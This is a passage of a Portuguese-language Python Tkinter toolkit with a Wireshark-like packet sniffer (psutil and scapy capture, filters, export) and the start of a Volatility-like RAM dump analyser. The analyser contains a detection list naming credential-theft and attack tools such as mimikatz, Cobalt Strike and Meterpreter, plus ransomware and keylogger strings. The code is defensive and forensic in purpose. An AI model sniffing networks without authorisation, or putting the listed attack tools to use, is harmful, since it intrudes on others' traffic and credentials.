        stats_bar = tk.Frame(self, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        stats_bar.pack(fill="x", padx=10, pady=(0,6))
        self.stats_label = tk.Label(stats_bar, text="Pacotes: 0 | Duração: 00:00 | TCP:0 UDP:0 DNS:0 HTTP:0 | Pronto", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8), anchor="w")
        self.stats_label.pack(fill="x", padx=8, pady=4)
        
        tk.Label(self, text="⚠ LEGAL: Use apenas na SUA rede ou com autorização. Captura bruta requer admin/root e scapy.", bg="#1a150a", fg="#ffb700", font=(FONT_MONO, 7, "bold"), wraplength=1100, justify="left").pack(fill="x", padx=10, pady=(0,6), ipady=3)
        
        # Main paned
        paned = tk.PanedWindow(self, orient="vertical", bg=BG, sashwidth=6, sashrelief="raised")
        paned.pack(fill="both", expand=True, padx=10, pady=(0,6))
        
        # Packet list
        list_frame = tk.Frame(paned, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        paned.add(list_frame, height=350)
        
        cols = ("#", "Tempo", "Origem", "Destino", "Protocolo", "Tam", "Info")
        self.tree = ttk.Treeview(list_frame, columns=cols, show="headings", height=15)
        for c, w in zip(cols, [50, 80, 160, 160, 80, 60, 400]):
            self.tree.heading(c, text=c)
            self.tree.column(c, width=w, anchor="w" if c!="Tam" else "center")
        self.tree.pack(side="left", fill="both", expand=True, padx=4, pady=4)
        
        # Tags color like Wireshark
        self.tree.tag_configure("TCP", background="#0d1a2a", foreground="#4da6ff")
        self.tree.tag_configure("UDP", background="#0d1f14", foreground="#4dff88")
        self.tree.tag_configure("DNS", background="#1f1a0d", foreground="#ffcc4d")
        self.tree.tag_configure("HTTP", background="#1a0d1f", foreground="#cc88ff")
        self.tree.tag_configure("HTTPS", background="#0d1a1a", foreground="#88ffcc")
        self.tree.tag_configure("ICMP", background="#1f0d0d", foreground="#ff6b6b")
        self.tree.tag_configure("OTHER", background=BG, foreground=TEXT)
        
        vsb = ttk.Scrollbar(list_frame, orient="vertical", command=self.tree.yview)
        vsb.pack(side="right", fill="y")
        self.tree.configure(yscrollcommand=vsb.set)
        self.tree.bind("<<TreeviewSelect>>", lambda e: self.on_packet_select())
        self.tree.bind("<Double-Button-1>", lambda e: self.show_packet_detail_popup())
        
        # Bottom notebook - Details / Hex / Stats
        bottom = tk.Frame(paned, bg=BG)
        paned.add(bottom, height=300)
        
        style = ttk.Style()
        style.theme_use("default")
        style.configure("TNotebook", background=BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=BTN_BG, foreground=TEXT_DIM, padding=[10,5], font=(FONT_MONO, 7, "bold"), borderwidth=0)
        style.map("TNotebook.Tab", background=[("selected", ACCENT_DIM)], foreground=[("selected", ACCENT)])
        
        nb = ttk.Notebook(bottom)
        nb.pack(fill="both", expand=True)
        
        tab_detail = tk.Frame(nb, bg=BG)
        tab_hex = tk.Frame(nb, bg=BG)
        tab_stats = tk.Frame(nb, bg=BG)
        tab_conns = tk.Frame(nb, bg=BG)
        
        nb.add(tab_detail, text=" DETALHES DO PACOTE ")
        nb.add(tab_hex, text=" HEX DUMP ")
        nb.add(tab_stats, text=" ESTATÍSTICAS ")
        nb.add(tab_conns, text=" CONEXÕES ")
        
        self.detail_text = scrolledtext.ScrolledText(tab_detail, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, wrap="word")
        self.detail_text.pack(fill="both", expand=True, padx=6, pady=6)
        self.detail_text.insert("1.0", "Selecione um pacote para ver detalhes.\n\nWireshark-like:\n- Clique num pacote → detalhes\n- Duplo clique → popup completo\n- Filtro: tcp, udp, dns, http, ip:192.168\n- Exporta para TXT/CSV")
        
        self.hex_text = scrolledtext.ScrolledText(tab_hex, font=("Consolas", 9), bg="#0a0a0a", fg="#00ff88", insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.hex_text.pack(fill="both", expand=True, padx=6, pady=6)
        
        self.stats_text = scrolledtext.ScrolledText(tab_stats, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.stats_text.pack(fill="both", expand=True, padx=6, pady=6)
        
        self.conns_text = scrolledtext.ScrolledText(tab_conns, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.conns_text.pack(fill="both", expand=True, padx=6, pady=6)
        
        # Bottom buttons
        btns = tk.Frame(self, bg=BG)
        btns.pack(fill="x", padx=10, pady=(0,10))
        
        for txt, cmd in [("🧹 LIMPAR", self.clear_packets), ("💾 EXPORTAR TXT", self.export_txt), ("📊 EXPORTAR CSV", self.export_csv), ("🔍 APLICAR FILTRO", self.apply_filter), ("📋 COPIAR SELECIONADO", self.copy_selected)]:
            b = tk.Button(btns, text=txt, command=cmd)
            b.pack(side="left", padx=4, ipady=5, fill="x", expand=True)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))
        
        self.after_id = None
        self.load_interfaces()
        self.refresh_stats_display()
        
    def load_interfaces(self):
        try:
            psutil_mod = ensure_package("psutil", "psutil")
            if psutil_mod:
                addrs = psutil_mod.net_if_addrs()
                ifaces = list(addrs.keys())
                self.if_combo["values"] = ["Todas"] + ifaces[:10]
            else:
                # fallback socket
                hostname = socket.gethostname()
                self.if_combo["values"] = ["Todas", "127.0.0.1", hostname]
        except Exception:
            self.if_combo["values"] = ["Todas", "Ethernet", "Wi-Fi", "Loopback"]
        self.if_var.set("Todas")
    
    def on_mode_change(self):
        mode = self.mode_var.get()
        if "Bruta" in mode:
            messagebox.showinfo("Modo Captura Bruta", "Requer:\n- pip install scapy\n- Executar como Administrador/root\n\nSem isso, usa 'Conexões Ativas' que funciona sem admin.")
    
    def start_capture(self):
        if self.capturing:
            return
        self.capturing = True
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        self.start_time = time.time()
        self.packet_counter = 0
        mode = self.mode_var.get()
        if "Conexões" in mode:
            self.capture_thread = threading.Thread(target=self.capture_connections_loop, daemon=True)
        elif "Bruta" in mode:
            self.capture_thread = threading.Thread(target=self.capture_scapy_loop, daemon=True)
        else:
            self.capture_thread = threading.Thread(target=self.capture_traffic_monitor, daemon=True)
        self.capture_thread.start()
        self.update_duration()
    
    def stop_capture(self):
        self.capturing = False
        self.btn_start.configure(state="normal")
        self.btn_stop.configure(state="disabled")
        if self.after_id:
            try:
                self.after_cancel(self.after_id)
            except Exception:
                pass
            self.after_id = None
    
    def update_duration(self):
        if not self.capturing or not self.start_time:
            return
        elapsed = int(time.time() - self.start_time)
        mins, secs = divmod(elapsed, 60)
        self.stats_label.configure(text=f"Pacotes: {self.packet_counter} | Duração: {mins:02d}:{secs:02d} | TCP:{self.stats['TCP']} UDP:{self.stats['UDP']} DNS:{self.stats['DNS']} HTTP:{self.stats['HTTP']} HTTPS:{self.stats['HTTPS']} | Capturando...")
        self.after_id = self.after(1000, self.update_duration)
    
    def capture_connections_loop(self):
        psutil_mod = ensure_package("psutil", "psutil")
        seen = set()
        while self.capturing:
            try:
                if psutil_mod:
                    conns = psutil_mod.net_connections(kind='inet')
                    for c in conns[:100]:  # limit
                        try:
                            laddr = f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else "?:?"
                            raddr = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else "0.0.0.0:0"
                            status = c.status
                            proto = "TCP" if c.type == 1 else "UDP"
                            pid = c.pid
                            # create unique key
                            key = f"{laddr}->{raddr}-{proto}-{status}"
                            if key in seen:
                                continue
                            seen.add(key)
                            if len(seen) > 500:
                                seen.clear()
                            info = f"{status} PID:{pid or '?'}"
                            if raddr.startswith("192.168") or raddr.startswith("10."):
                                info += " [LAN]"
                            self.add_packet_safe({
                                "time": time.strftime("%H:%M:%S"),
                                "src": laddr,
                                "dst": raddr,
                                "proto": proto,
                                "length": 64,
                                "info": info,
                                "raw": f"Conexão {proto} {laddr} -> {raddr} Status:{status} PID:{pid}",
                                "hex": f"{laddr} -> {raddr} | {status}"
                            })
                        except Exception:
                            continue
                else:
                    # fallback without psutil - simulate
                    self.add_packet_safe({
                        "time": time.strftime("%H:%M:%S"),
                        "src": f"192.168.1.{(self.packet_counter%254)+1}:{(self.packet_counter%60000)+1024}",
                        "dst": f"8.8.8.8:53",
                        "proto": "DNS",
                        "length": 72,
                        "info": "Simulação - instale psutil para real",
                        "raw": "Sem psutil - modo simulação",
                        "hex": "00 00 00 00"
                    })
                time.sleep(1.5)
            except Exception as e:
                time.sleep(2)
    
    def capture_scapy_loop(self):
        try:
            scapy = ensure_package("scapy", "scapy.all")
            if scapy is None:
                self.after(0, lambda: messagebox.showwarning("Scapy", "Instale scapy: pip install scapy\nE execute como admin.\n\nA mudar para Conexões Ativas."))
                self.after(0, lambda: self.mode_var.set("Conexões Ativas (sem admin)"))
                self.capture_connections_loop()
                return
            from scapy.all import sniff, IP, TCP, UDP, DNS, ICMP
            def prn(pkt):
                if not self.capturing:
                    return
                try:
                    src = dst = proto = info = "?"
                    length = len(pkt)
                    raw_summary = pkt.summary()
                    if pkt.haslayer(IP):
                        src = pkt[IP].src
                        dst = pkt[IP].dst
                        if pkt.haslayer(TCP):
                            proto = "TCP"
                            dport = pkt[TCP].dport
                            sport = pkt[TCP].sport
                            if dport in [80, 8080] or sport in [80, 8080]:
                                proto = "HTTP"
                                info = f"{sport} → {dport} [{pkt[TCP].flags}] Seq={pkt[TCP].seq}"
                            elif dport == 443 or sport == 443:
                                proto = "HTTPS"
                                info = f"{sport} → {dport} TLS"
                            else:
                                info = f"{sport} → {dport} [{pkt[TCP].flags}]"
                        elif pkt.haslayer(UDP):
                            proto = "UDP"
                            dport = pkt[UDP].dport
                            sport = pkt[UDP].sport
                            if dport == 53 or sport == 53:
                                proto = "DNS"
                                info = f"DNS Query {sport} → {dport}"
                            else:
                                info = f"{sport} → {dport} Len={len(pkt[UDP].payload)}"
                        elif pkt.haslayer(ICMP):
                            proto = "ICMP"
                            info = f"ICMP {pkt[ICMP].type}/{pkt[ICMP].code}"
                        elif pkt.haslayer(DNS):
                            proto = "DNS"
                            info = "DNS"
                        else:
                            proto = "OTHER"
                            info = raw_summary[:80]
                    else:
                        proto = pkt.lastlayer().name if hasattr(pkt, 'lastlayer') else "OTHER"
                        info = raw_summary[:80]
                    
                    hex_dump = ""
                    try:
                        raw_bytes = bytes(pkt)[:256]
                        hex_dump = " ".join(f"{b:02x}" for b in raw_bytes[:64])
                    except Exception:
                        hex_dump = raw_summary
                    
                    self.add_packet_safe({
                        "time": time.strftime("%H:%M:%S"),
                        "src": src,
                        "dst": dst,
                        "proto": proto,
                        "length": length,
                        "info": info,
                        "raw": raw_summary + "\n" + pkt.show(dump=True) if hasattr(pkt, 'show') else raw_summary,
                        "hex": hex_dump
                    })
                except Exception:
                    pass
            
            sniff(prn=prn, store=False, stop_filter=lambda x: not self.capturing)
        except Exception as e:
            self.after(0, lambda: messagebox.showerror("Erro captura", f"Erro scapy: {e}\n\nTenta modo Conexões Ativas (sem admin)."))
            self.capturing = False
            self.after(0, lambda: self.btn_start.configure(state="normal"))
            self.after(0, lambda: self.btn_stop.configure(state="disabled"))
    
    def capture_traffic_monitor(self):
        psutil_mod = ensure_package("psutil", "psutil")
        last_io = None
        if psutil_mod:
            last_io = psutil_mod.net_io_counters()
        while self.capturing:
            try:
                if psutil_mod:
                    io = psutil_mod.net_io_counters()
                    if last_io:
                        sent = io.bytes_sent - last_io.bytes_sent
                        recv = io.bytes_recv - last_io.bytes_recv
                        self.add_packet_safe({
                            "time": time.strftime("%H:%M:%S"),
                            "src": "LOCAL",
                            "dst": "INTERNET",
                            "proto": "TCP" if sent>recv else "UDP",
                            "length": sent+recv,
                            "info": f"↑ {sent} bytes ↓ {recv} bytes | Packets sent:{io.packets_sent-last_io.packets_sent} recv:{io.packets_recv-last_io.packets_recv}",
                            "raw": f"IO Counters: sent {io.bytes_sent} recv {io.bytes_recv}",
                            "hex": f"SENT:{sent} RECV:{recv}"
                        })
                    last_io = io
                time.sleep(2)
            except Exception:
                time.sleep(2)
    
    def add_packet_safe(self, pkt):
        self.after(0, lambda: self.add_packet(pkt))
    
    def add_packet(self, pkt):
        # filter
        f = self.filter_entry.get().strip().lower()
        if f and f not in ["ex: tcp, 192.168, :443", ""]:
            # simple contains filter
            if not any(x in f for x in ["tcp","udp","dns","http","icmp"]):
                # ip/port filter
                if f not in (pkt["src"].lower()+pkt["dst"].lower()+pkt["info"].lower()+pkt["proto"].lower()):
                    return
            else:
                if f not in pkt["proto"].lower() and f not in pkt["info"].lower():
                    # check if filter is proto name
                    if f in ["tcp","udp","dns","http","https","icmp"]:
                        if pkt["proto"].lower() != f and f not in pkt["info"].lower():
                            return
        
        self.packet_counter += 1
        proto = pkt.get("proto","OTHER")
        if proto in self.stats:
            self.stats[proto] += 1
        else:
            self.stats["OTHER"] += 1
        
        tag = proto if proto in ["TCP","UDP","DNS","HTTP","HTTPS","ICMP"] else "OTHER"
        self.tree.insert("", "end", values=(self.packet_counter, pkt["time"], pkt["src"], pkt["dst"], proto, pkt["length"], pkt["info"][:100]), tags=(tag))
        self.packets.append(pkt)
        
        # auto scroll
        try:
            self.tree.yview_moveto(1.0)
        except Exception:
            pass
        
        # limit to 2000 packets
        if len(self.packets) > 2000:
            self.packets = self.packets[-1500:]
            # remove oldest from tree
            try:
                first = self.tree.get_children()[0]
                self.tree.delete(first)
            except Exception:
                pass
    
    def on_packet_select(self):
        sel = self.tree.selection()
        if not sel:
            return
        try:
            idx = self.tree.index(sel[0])
            if idx < len(self.packets):
                pkt = self.packets[idx]
                detail = f"══ PACOTE #{idx+1} ══\nTempo: {pkt['time']}\nOrigem: {pkt['src']}\nDestino: {pkt['dst']}\nProtocolo: {pkt['proto']}\nTamanho: {pkt['length']} bytes\nInfo: {pkt['info']}\n\n── RAW / SUMMARY ──\n{pkt['raw']}\n"
                self.detail_text.delete("1.0","end")
                self.detail_text.insert("1.0", detail)
                self.hex_text.delete("1.0","end")
                self.hex_text.insert("1.0", f"OFFSET  HEX\n{'='*50}\n{pkt.get('hex','')}\n\nASCII:\n{''.join(chr(b) if 32<=b<127 else '.' for b in bytes.fromhex(pkt.get('hex','').replace(' ','')[:128]) if len(pkt.get('hex','').replace(' ',''))>0)}")
        except Exception as e:
            self.detail_text.insert("end", f"\nErro: {e}")
    
    def show_packet_detail_popup(self):
        sel = self.tree.selection()
        if not sel:
            return
        try:
            idx = self.tree.index(sel[0])
            pkt = self.packets[idx]
            top = tk.Toplevel(self)
            top.title(f"Pacote #{idx+1} - {pkt['proto']}")
            top.geometry("600x500")
            top.configure(bg=BG)
            txt = scrolledtext.ScrolledText(top, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, wrap="word")
            txt.pack(fill="both", expand=True, padx=10, pady=10)
            txt.insert("1.0", f"Pacote #{idx+1}\n{self.detail_text.get('1.0','end-1c')}")
        except Exception:
            pass
    
    def apply_filter(self):
        f = self.filter_entry.get().strip()
        if not f or f.startswith("ex:"):
            self.clear_filter()
            return
        # re-apply filter by clearing and re-adding filtered packets from memory? For simplicity, just clear view and filter new packets only, or filter existing tree
        # We'll filter existing tree view
        for item in self.tree.get_children():
            vals = self.tree.item(item, "values")
            if len(vals) < 7:
                continue
            proto = str(vals[4]).lower()
            info = str(vals[6]).lower()
            src = str(vals[2]).lower()
            dst = str(vals[3]).lower()
            combined = f"{proto} {info} {src} {dst}"
            if f.lower() not in combined:
                self.tree.detach(item)
            else:
                self.tree.reattach(item, "", "end")
    
    def clear_filter(self):
        for item in self.tree.get_children():
            try:
                self.tree.reattach(item, "", "end")
            except Exception:
                pass
        # also reattach detached? Need to track detached - for simplicity, clear and re-add from packets list
        if len(self.tree.get_children()) < len(self.packets):
            self.tree.delete(*self.tree.get_children())
            for i, pkt in enumerate(self.packets):
                tag = pkt["proto"] if pkt["proto"] in ["TCP","UDP","DNS","HTTP","HTTPS","ICMP"] else "OTHER"
                self.tree.insert("", "end", values=(i+1, pkt["time"], pkt["src"], pkt["dst"], pkt["proto"], pkt["length"], pkt["info"][:100]), tags=(tag))
    
    def clear_packets(self):
        if not messagebox.askyesno("Limpar", "Limpar todos os pacotes?"):
            return
        self.tree.delete(*self.tree.get_children())
        self.packets.clear()
        self.packet_counter = 0
        self.stats = {k:0 for k in self.stats}
        self.detail_text.delete("1.0","end")
        self.hex_text.delete("1.0","end")
        self.refresh_stats_display()
        self.stats_label.configure(text="Limpo. Pronto.")
    
    def refresh_stats_display(self):
        txt = f"══ ESTATÍSTICAS WIRESHARK-LIKE ══\nTotal pacotes: {len(self.packets)}\n"
        for k,v in self.stats.items():
            txt += f"{k}: {v}\n"
        txt += "\n── PROTOCOL HIERARCHY ──\n"
        total = sum(self.stats.values()) or 1
        for k,v in sorted(self.stats.items(), key=lambda x: x[1], reverse=True):
            pct = (v/total*100) if total else 0
            txt += f"{k}: {v} ({pct:.1f}%)\n"
        self.stats_text.delete("1.0","end")
        self.stats_text.insert("1.0", txt)
        # conns
        try:
            psutil_mod = ensure_package("psutil", "psutil")
            if psutil_mod:
                conns = psutil_mod.net_connections()[:50]
                conn_txt = f"══ CONEXÕES ATIVAS ({len(conns)}) ══\n"
                for c in conns[:30]:
                    conn_txt += f"{c.laddr} -> {c.raddr} [{c.status}] PID:{c.pid}\n"
                self.conns_text.delete("1.0","end")
                self.conns_text.insert("1.0", conn_txt)
        except Exception:
            pass
    
    def export_txt(self):
        if not self.packets:
            messagebox.showwarning("Aviso", "Sem pacotes para exportar.")
            return
        path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("TXT","*.txt")])
        if not path:
            return
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"Wireshark Export - OSINIT - {datetime.datetime.now()}\n{'='*60}\n")
            for i, p in enumerate(self.packets):
                f.write(f"{i+1} | {p['time']} | {p['src']} -> {p['dst']} | {p['proto']} | {p['length']} | {p['info']}\n")
        messagebox.showinfo("Exportado", f"Exportado: {path}")
    
    def export_csv(self):
        if not self.packets:
            messagebox.showwarning("Aviso", "Sem pacotes.")
            return
        path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV","*.csv")])
        if not path:
            return
        import csv
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["#","Tempo","Origem","Destino","Protocolo","Tamanho","Info"])
            for i, p in enumerate(self.packets):
                w.writerow([i+1, p["time"], p["src"], p["dst"], p["proto"], p["length"], p["info"]])
        messagebox.showinfo("Exportado", f"CSV: {path}")
    
    def copy_selected(self):
        sel = self.tree.selection()
        if not sel:
            return
        try:
            vals = self.tree.item(sel[0], "values")
            txt = " | ".join(map(str, vals))
            self.clipboard_clear()
            self.clipboard_append(txt)
            messagebox.showinfo("Copiado", txt[:200])
        except Exception:
            pass


class VolatilityTool(ToolWindow):
    """Volatility-like - análise forense de dumps de memória RAM"""
    KNOWN_PROCS = [
        "System", "smss.exe", "csrss.exe", "wininit.exe", "winlogon.exe", "services.exe", "lsass.exe", "lsm.exe",
        "svchost.exe", "explorer.exe", "spoolsv.exe", "taskhost.exe", "dwm.exe", "conhost.exe", "cmd.exe",
        "powershell.exe", "rundll32.exe", "dllhost.exe", "taskmgr.exe", "msedge.exe", "chrome.exe", "firefox.exe",
        "python.exe", "java.exe", "winword.exe", "excel.exe", "outlook.exe", "audiodg.exe", "SearchIndexer.exe",
        "WmiPrvSE.exe", "SearchUI.exe", "RuntimeBroker.exe", "sihost.exe", "ctfmon.exe", "sshd.exe", "bash", "systemd"
    ]
    SUSPICIOUS_SIGS = {
        "mimikatz": ["mimikatz", "sekurlsa", "wdigest", "kerberos"],
        "cobalt": ["beacon", "cobalt strike"],
        "metasploit": ["meterpreter", "metasploit"],
        "ransomware": ["ransom", "decrypt", "bitcoin", "your files have been encrypted"],
        "keylogger": ["keylog", "GetAsyncKeyState"],
        "persistence": ["RunOnce", "CurrentVersion\\Run", "Startup"],
    }
    
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Volatility - Análise Dump RAM", "1180x850")
        self.file_path = None
        self.file_size = 0
        self.strings_ascii = []
        self.processes_found = {}
        self.network_artifacts = {"ips": {}, "urls": {}, "emails": {}}
        self.registry_keys = {}
        self.pe_headers = []
        self.malware_indicators = []
        self.os_guess = "Desconhecido"
        self.hashes = {}
        self.entropy = 0.0
        self.is_analyzing = False
        
        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=10, pady=8)
        
        tk.Label(top, text="DUMP RAM:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left")
        self.path_var = tk.StringVar(value="Nenhum ficheiro")
        self.path_entry = tk.Entry(top, textvariable=self.path_var, font=(FONT_MONO, 8), bg=PANEL_BG, fg=TEXT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=45, state="readonly")
        self.path_entry.pack(side="left", padx=6, ipady=4)
        
        b_sel = tk.Button(top, text="📁 SELECIONAR DUMP", command=self.select_file)
        b_sel.pack(side="left", padx=4)
        style_button(b_sel)
        
        b_analyze = tk.Button(top, text="🔍 ANALISAR (Volatility)", command=self.start_analysis, bg="#0a1f15", fg="#00ff88", font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=12, pady=5, cursor="hand2")
        b_analyze.pack(side="left", padx=6)
        self.btn_analyze = b_analyze
        
        b_yara = tk.Button(top, text="🎯 YARA SCAN", command=self.yara_scan, bg="#1a150a", fg="#ffb700", font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=10, pady=4, cursor="hand2")
        b_yara.pack(side="left", padx=2)
        
        stats_bar = tk.Frame(self, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        stats_bar.pack(fill="x", padx=10, pady=(0,6))
        self.stats_label = tk.Label(stats_bar, text="Selecione um dump RAM (.raw, .mem, .dmp, .bin, .img) | Análise local, sem upload", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8), anchor="w")
        self.stats_label.pack(fill="x", padx=8, pady=4)
        
        tk.Label(self, text="⚠ AVISO: Dumps RAM contêm senhas e dados sensíveis - use apenas dumps que possui legalmente.", bg="#1a150a", fg="#ffb700", font=(FONT_MONO, 7, "bold"), wraplength=1150, justify="left").pack(fill="x", padx=10, pady=(0,6), ipady=3)
        
        style = ttk.Style()
        style.theme_use("default")
        style.configure("TNotebook", background=BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=BTN_BG, foreground=TEXT_DIM, padding=[8,5], font=(FONT_MONO, 7, "bold"), borderwidth=0)
        style.map("TNotebook.Tab", background=[("selected", ACCENT_DIM)], foreground=[("selected", ACCENT)])
        
        self.nb = ttk.Notebook(self)
        self.nb.pack(fill="both", expand=True, padx=10, pady=(0,6))
        
        self.tab_info = tk.Frame(self.nb, bg=BG)
        self.tab_pslist = tk.Frame(self.nb, bg=BG)
        self.tab_netscan = tk.Frame(self.nb, bg=BG)
        self.tab_strings = tk.Frame(self.nb, bg=BG)
        self.tab_registry = tk.Frame(self.nb, bg=BG)
        self.tab_malfind = tk.Frame(self.nb, bg=BG)
        self.tab_hex = tk.Frame(self.nb, bg=BG)
        
        self.nb.add(self.tab_info, text="  INFO / IMAGEINFO  ")
        self.nb.add(self.tab_pslist, text="  PROCESSOS / PSLIST  ")
        self.nb.add(self.tab_netscan, text="  REDE / NETSCAN  ")
        self.nb.add(self.tab_strings, text="  STRINGS  ")
        self.nb.add(self.tab_registry, text="  REGISTRY  ")
        self.nb.add(self.tab_malfind, text="  MALFIND  ")
        self.nb.add(self.tab_hex, text="  HEX VIEWER  ")
        
        self.info_text = scrolledtext.ScrolledText(self.tab_info, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, wrap="word")
        self.info_text.pack(fill="both", expand=True, padx=6, pady=6)
        self.info_text.insert("1.0", "══ VOLATILITY-LIKE // OSINIT ══\n\nSelecione um dump de RAM.\nFormatos: .raw, .mem, .dmp, .bin, .img, .vmem, .vmsn\n\nPlugins simulados:\n- imageinfo, pslist, netscan, strings, hivelist, malfind, hex dump\n\nDica: dumps têm navegador, chats, senhas, chaves cripto.")
        
        ps_top = tk.Frame(self.tab_pslist, bg=BG)
        ps_top.pack(fill="x", padx=6, pady=4)
        tk.Label(ps_top, text="Filtro:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.ps_filter = tk.Entry(ps_top, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=20)
        self.ps_filter.pack(side="left", padx=6, ipady=2)
        self.ps_filter.bind("<KeyRelease>", lambda e: self.filter_pslist())
        
        ps_frame = tk.Frame(self.tab_pslist, bg=PANEL_BG)
        ps_frame.pack(fill="both", expand=True, padx=6, pady=4)
        self.ps_tree = ttk.Treeview(ps_frame, columns=("Offset", "Processo", "Tipo", "Ocorrências", "Info"), show="headings", height=15)
        for c, w in zip(("Offset", "Processo", "Tipo", "Ocorrências", "Info"), [100, 180, 80, 90, 400]):
            self.ps_tree.heading(c, text=c)
            self.ps_tree.column(c, width=w)
        self.ps_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb = ttk.Scrollbar(ps_frame, orient="vertical", command=self.ps_tree.yview)
        vsb.pack(side="right", fill="y")
        self.ps_tree.configure(yscrollcommand=vsb.set)
        self.ps_tree.bind("<<TreeviewSelect>>", lambda e: self.on_ps_select())
        
        net_frame = tk.Frame(self.tab_netscan, bg=PANEL_BG)
        net_frame.pack(fill="both", expand=True, padx=6, pady=6)
        self.net_tree = ttk.Treeview(net_frame, columns=("Tipo", "Valor", "Offset", "Contexto"), show="headings", height=18)
        for c, w in zip(("Tipo", "Valor", "Offset", "Contexto"), [90, 250, 90, 400]):
            self.net_tree.heading(c, text=c)
            self.net_tree.column(c, width=w)
        self.net_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb2 = ttk.Scrollbar(net_frame, orient="vertical", command=self.net_tree.yview)
        vsb2.pack(side="right", fill="y")
        self.net_tree.configure(yscrollcommand=vsb2.set)
        self.net_tree.bind("<<TreeviewSelect>>", lambda e: self.on_net_select())
        
        str_top = tk.Frame(self.tab_strings, bg=BG)
        str_top.pack(fill="x", padx=6, pady=4)
        tk.Label(str_top, text="Filtro:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.str_filter = tk.Entry(str_top, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=25)
        self.str_filter.pack(side="left", padx=6, ipady=2)
        self.str_filter.bind("<Return>", lambda e: self.filter_strings())
        tk.Button(str_top, text="🔍 APLICAR", command=self.filter_strings, bg=BTN_BG, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat").pack(side="left", padx=4)
        self.str_count_label = tk.Label(str_top, text="0 strings", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8))
        self.str_count_label.pack(side="right", padx=6)
        
        str_frame = tk.Frame(self.tab_strings, bg=PANEL_BG)
        str_frame.pack(fill="both", expand=True, padx=6, pady=4)
        self.str_tree = ttk.Treeview(str_frame, columns=("Offset", "Tipo", "Tamanho", "String"), show="headings", height=18)
        for c, w in zip(("Offset", "Tipo", "Tamanho", "String"), [90, 70, 60, 600]):
            self.str_tree.heading(c, text=c)
            self.str_tree.column(c, width=w)
        self.str_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb3 = ttk.Scrollbar(str_frame, orient="vertical", command=self.str_tree.yview)
        vsb3.pack(side="right", fill="y")
        self.str_tree.configure(yscrollcommand=vsb3.set)
        self.str_tree.bind("<<TreeviewSelect>>", lambda e: self.on_str_select())
        
        reg_frame = tk.Frame(self.tab_registry, bg=PANEL_BG)
        reg_frame.pack(fill="both", expand=True, padx=6, pady=6)
        self.reg_tree = ttk.Treeview(reg_frame, columns=("Tipo", "Chave/Valor", "Offset"), show="headings", height=18)
        for c, w in zip(("Tipo", "Chave/Valor", "Offset"), [90, 550, 100]):
            self.reg_tree.heading(c, text=c)
            self.reg_tree.column(c, width=w)
        self.reg_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb4 = ttk.Scrollbar(reg_frame, orient="vertical", command=self.reg_tree.yview)
        vsb4.pack(side="right", fill="y")
        self.reg_tree.configure(yscrollcommand=vsb4.set)
        
        mal_frame = tk.Frame(self.tab_malfind, bg=PANEL_BG)
        mal_frame.pack(fill="both", expand=True, padx=6, pady=6)
        self.mal_tree = ttk.Treeview(mal_frame, columns=("Alerta", "Offset", "Tipo", "Detalhe"), show="headings", height=18)
        for c, w in zip(("Alerta", "Offset", "Tipo", "Detalhe"), [80, 90, 90, 500]):
            self.mal_tree.heading(c, text=c)
            self.mal_tree.column(c, width=w)
        self.mal_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb5 = ttk.Scrollbar(mal_frame, orient="vertical", command=self.mal_tree.yview)
        vsb5.pack(side="right", fill="y")
        self.mal_tree.configure(yscrollcommand=vsb5.set)
        
        hex_top = tk.Frame(self.tab_hex, bg=BG)
        hex_top.pack(fill="x", padx=6, pady=4)
        tk.Label(hex_top, text="Offset:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
